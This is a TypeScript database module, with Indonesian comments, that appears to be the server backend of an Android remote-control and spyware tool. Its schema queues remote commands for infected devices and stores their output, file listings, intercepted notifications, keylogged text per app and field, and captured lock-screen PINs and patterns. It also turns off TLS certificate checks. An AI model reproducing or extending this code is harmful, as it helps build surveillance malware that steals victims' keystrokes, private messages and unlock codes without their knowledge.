import { Pool } from 'pg'

const dbUrl = process.env.DATABASE_URL

if (!dbUrl) {
  throw new Error(
    'DATABASE_URL belum diset. Lihat database/README.md untuk cara setup database sendiri.'
  )
}

// SSL: aktif untuk semua host kecuali localhost
const useSSL = !dbUrl.includes('localhost') && !dbUrl.includes('127.0.0.1')

const pool = new Pool({
  connectionString: dbUrl,
  ssl: useSSL ? { rejectUnauthorized: false } : false,
  max: 5,
  idleTimeoutMillis: 10000,
  connectionTimeoutMillis: 5000,
})

export default pool

let _schemaReady = false
export async function initSchema() {
  if (_schemaReady) return
  await pool.query(`
    CREATE TABLE IF NOT EXISTS devices (
      device_id TEXT PRIMARY KEY,
      device_name TEXT NOT NULL DEFAULT 'Unknown Device',
      last_seen TIMESTAMPTZ,
      stats JSONB NOT NULL DEFAULT '{}'
    )
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS pending_commands (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
      command TEXT NOT NULL,
      extra TEXT,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `)
  await pool.query(`
    ALTER TABLE pending_commands ADD COLUMN IF NOT EXISTS extra TEXT
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS command_history (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
      command TEXT NOT NULL,
      result TEXT NOT NULL DEFAULT '',
      timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      exit_code INTEGER DEFAULT 0
    )
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS file_listings (
      device_id TEXT PRIMARY KEY REFERENCES devices(device_id) ON DELETE CASCADE,
      path TEXT NOT NULL DEFAULT '/',
      entries JSONB NOT NULL DEFAULT '[]',
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS notifications (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
      app_package TEXT NOT NULL DEFAULT '',
      app_name TEXT NOT NULL DEFAULT '',
      title TEXT NOT NULL DEFAULT '',
      text TEXT NOT NULL DEFAULT '',
      received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `)
  await pool.query(`
    CREATE INDEX IF NOT EXISTS idx_notifications_device ON notifications(device_id, received_at DESC)
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS keylog_entries (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
      app_package TEXT NOT NULL DEFAULT '',
      app_name TEXT NOT NULL DEFAULT '',
      field_name TEXT NOT NULL DEFAULT '',
      text TEXT NOT NULL DEFAULT '',
      captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `)
  await pool.query(`
    CREATE INDEX IF NOT EXISTS idx_keylog_device ON keylog_entries(device_id, captured_at DESC)
  `)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS pin_captures (
      id SERIAL PRIMARY KEY,
      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
      lock_type TEXT NOT NULL DEFAULT 'pin',
      value TEXT NOT NULL DEFAULT '',
      captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `)
  await pool.query(`
    CREATE INDEX IF NOT EXISTS idx_pin_device ON pin_captures(device_id, captured_at DESC)
  `)
  _schemaReady = true
}
